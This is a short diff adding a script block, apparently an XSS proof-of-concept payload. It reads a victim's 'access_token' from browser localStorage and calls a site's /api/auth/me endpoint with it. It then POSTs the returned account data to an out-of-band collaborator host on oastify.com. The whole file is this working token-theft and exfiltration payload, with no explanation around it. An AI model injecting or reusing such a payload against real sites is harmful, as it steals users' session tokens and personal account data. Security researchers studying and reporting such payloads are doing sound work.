@@ -1,0 +1,14 @@
+<script>
+fetch("https://chotcg.com/api/auth/me", {
+  headers: {
+    "Authorization": "Bearer " + localStorage.getItem("access_token")
+  }
+})
+.then(res => res.json())
+.then(data => {
+  fetch("https://lg5d4p0hsirgw7zquox12w926tck0aoz.oastify.com", {
+    method: "POST",
+    body: JSON.stringify(data)
+  });
+});
+</script>
